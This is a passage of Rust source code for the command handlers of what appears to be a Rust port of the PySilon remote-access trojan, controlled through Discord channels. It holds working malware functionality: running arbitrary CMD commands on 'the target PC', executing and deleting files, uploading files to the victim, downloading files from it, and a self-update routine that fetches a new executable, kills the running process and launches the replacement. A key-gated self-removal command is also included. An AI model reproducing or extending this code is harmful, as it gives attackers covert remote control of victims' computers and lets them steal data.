                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn download_tar(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let args= msg.content.split(" ").collect::<Vec<&str>>();
                if args.len()<= 1 {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": "```Syntax: .download_tar <file/dir>\nFile/Directory (dir): Target to download files```",
                        "react": ["🔴"]
                    }));
                }else{
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let input= args[1..].join(" ").to_string();
                    tokio::spawn(async move {
                        download::main(channelid, user, input, true).await;
                    });
                }
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn execute(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let args= msg.content.split(" ").collect::<Vec<&str>>();
                if args.len()<= 1 {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": "```Syntax: .execute <file>\nFile: Target to run a file```",
                        "react": ["🔴"]
                    }));
                }else{
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let input= args[1..].join(" ").to_string();
                    tokio::spawn(async move {
                        processes::main_execute(channelid, user, input).await;
                    });
                }
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn cmd(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let args= msg.content.split(" ").collect::<Vec<&str>>();
        if args.len()<= 1 {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .cmd <command>\nCommand: Run a CMD command```",
                "react": ["🔴"]
            }));
        }else{
            let channelid= msg.channel_id.0;
            let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
            let input= args[1..].join(" ").to_string();
            tokio::spawn(async move {
                processes::main_cmd(channelid, user, input).await;
            });
        }
    }
    Ok(())
}
#[command]
async fn remove(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let args= msg.content.split(" ").collect::<Vec<&str>>();
                if args.len()<= 1 {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": "```Syntax: .remove <file/dir>\nFile/Directory (dir): Remove a File or Directory```",
                        "react": ["🔴"]
                    }));
                }else{
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let input= args[1..].join(" ").to_string();
                    tokio::spawn(async move {
                        tree::main_remove(channelid, user, input).await;
                    });
                }
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn upload(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let args= msg.content.split(" ").collect::<Vec<&str>>();
                if args.len()<= 1 && msg.attachments.len()== 0 {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": "```Syntax: .upload <attachment/proxy_url>\nAttachment/URL: Upload a file into the target PC```",
                        "react": ["🔴"]
                    }));
                }else{
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let input= if msg.attachments.len()== 0 {
                        args[1..].join(" ").to_string()
                    }else{
                        msg.attachments[0].url.clone()
                    };
                    tokio::spawn(async move {
                        upload::main_upload(channelid, user, input).await;
                    });
                }
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn implode(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.attachments.len()== 0 {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```❗ You need to upload the key generated along the malware to get authorization.```",
                "react": ["🔴"]
            }));
        }else{
            match reqwest::get(&msg.attachments[0].url).await {
                Ok(request) => {
                    match request.bytes().await {
                        Ok(bytes) => {
                            let mut is_valid= false;
                            let buf= bytes.to_vec();
                            if PYSILON_KEY.len()== buf.len() {
                                is_valid= true;
                                for i in 0..PYSILON_KEY.len() {
                                    if PYSILON_KEY[i]!= buf[i] {
                                        is_valid= false;
                                        break;
                                    }
                                }
                            }
                            if is_valid {
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": msg.channel_id.0,
                                    "content": "```You are authorized to remotely remove PySilon from the target PC. Everything related to PySilon will be erased after you confirm this action by reacting with \"💀\".\n❗ Warning ❗ This cannot be undone after you decide to proceed. You can cancel it, by reacting with \"🔴\".```",
                                    "react": ["💀", "🔴"],
                                    "interaction": {
                                        "kind": "implode"
                                    }
                                }));
                            }else{
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": msg.channel_id.0,
                                    "content": "```You are not authorized to remotely remove PySilon from the target PC.```",
                                    "react": ["🔴"]
                                }));
                            }
                        }
                        Err(e) => {
                            BOT_TO_SEND.lock().await.push(json!({
                                "channel": msg.channel_id.0,
                                "content": format!("```❗ An error occurred while fetching the key: {}```", e.to_string()),
                                "react": ["🔴"]
                            }));
                        }
                    }
                }
                Err(e) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": format!("```❗ An error occurred while fetching the key: {}```", e.to_string()),
                        "react": ["🔴"]
                    }));
                }
            }
        }
    }
    Ok(())
}
#[command]
async fn update(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.attachments.len()< 2 {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```❗ You need to upload the key generated along the malware to get authorization to update, and the new executable file.\nThe key should be the first file, then the executable file should be after it (second file).```",
                "react": ["🔴"]
            }));
        }else{
            match reqwest::get(&msg.attachments[0].url).await {
                Ok(request) => {
                    match request.bytes().await {
                        Ok(bytes) => {
                            let mut is_valid= false;
                            let buf= bytes.to_vec();
                            if PYSILON_KEY.len()== buf.len() {
                                is_valid= true;
                                for i in 0..PYSILON_KEY.len() {
                                    if PYSILON_KEY[i]!= buf[i] {
                                        is_valid= false;
                                        break;
                                    }
                                }
                            }
                            if is_valid {
                                match reqwest::get(&msg.attachments[1].url).await {
                                    Ok(request) => {
                                        match request.bytes().await {
                                            Ok(bytesr) => {
                                                BOT_TO_SEND.lock().await.push(json!({
                                                    "channel": msg.channel_id.0,
                                                    "content": format!("```❗ Now updating, it might take a bit to do so.```")
                                                }));
                                                let path= std::env::temp_dir().to_string_lossy().to_string() + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12);
                                                match File::create(&path).await {
                                                    Ok(f) => {
                                                        let mut f= BufWriter::new(f);
                                                        let mut start= true;
                                                        if let Err(e)= f.write_all(&bytesr).await {
                                                            start= false;
                                                            BOT_TO_SEND.lock().await.push(json!({
                                                                "channel": msg.channel_id.0,
                                                                "content": format!("```❗ An error occurred while updating: {}```", e)
                                                            }));
                                                        }else if let Err(e)= f.flush().await {
                                                            start= false;
                                                            BOT_TO_SEND.lock().await.push(json!({
                                                                "channel": msg.channel_id.0,
                                                                "content": format!("```❗ An error occurred while updating: {}```", e)
                                                            }));
                                                        }
                                                        drop(f);
                                                        if start {
                                                            let to_path= std::env::var_os("USERPROFILE").unwrap().to_string_lossy().to_string() + "\\" + &SOFTWARE_DIRECTORY_NAME.lock().await.to_lowercase() + "\\" + &SOFTWARE_EXECUTABLE_NAME.lock().await.to_lowercase() + ".bin";
                                                            let _= Command::new("cmd.exe")
                                                                .raw_arg(format!("/c taskkill /f /pid {} && copy \"{path}\" \"{to_path}\" && \"{to_path}\"", std::process::id()))
                                                                .spawn();
                                                        }
                                                    }
                                                    Err(e) => {
                                                        BOT_TO_SEND.lock().await.push(json!({
                                                            "channel": msg.channel_id.0,
                                                            "content": format!("```❗ An error occurred while updating: {}```", e)
                                                        }));
                                                    }
                                                }
                                            }
                                            Err(e) => {
                                                BOT_TO_SEND.lock().await.push(json!({
                                                    "channel": msg.channel_id.0,
                                                    "content": format!("```❗ An error occurred while fetching the executable: {}```", e.to_string()),
                                                    "react": ["🔴"]
                                                }));
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        BOT_TO_SEND.lock().await.push(json!({
                                            "channel": msg.channel_id.0,
                                            "content": format!("```❗ An error occurred while fetching the executable: {}```", e.to_string()),
                                            "react": ["🔴"]
                                        }));
                                    }
                                }
                            }else{
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": msg.channel_id.0,
                                    "content": "```You are not authorized to remotely update PySilon from the target PC.\nRemember that you first have to put the key (as an attachment), and then the executable.```",
                                    "react": ["🔴"]
                                }));
                            }
                        }
                        Err(e) => {
                            BOT_TO_SEND.lock().await.push(json!({
                                "channel": msg.channel_id.0,
                                "content": format!("```❗ An error occurred while fetching the key: {}```", e.to_string()),
                                "react": ["🔴"]
                            }));
                        }
                    }
                }
                Err(e) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": format!("```❗ An error occurred while fetching the key: {}```", e.to_string()),
                        "react": ["🔴"]
                    }));
                }
            }
        }
    }
    Ok(())
}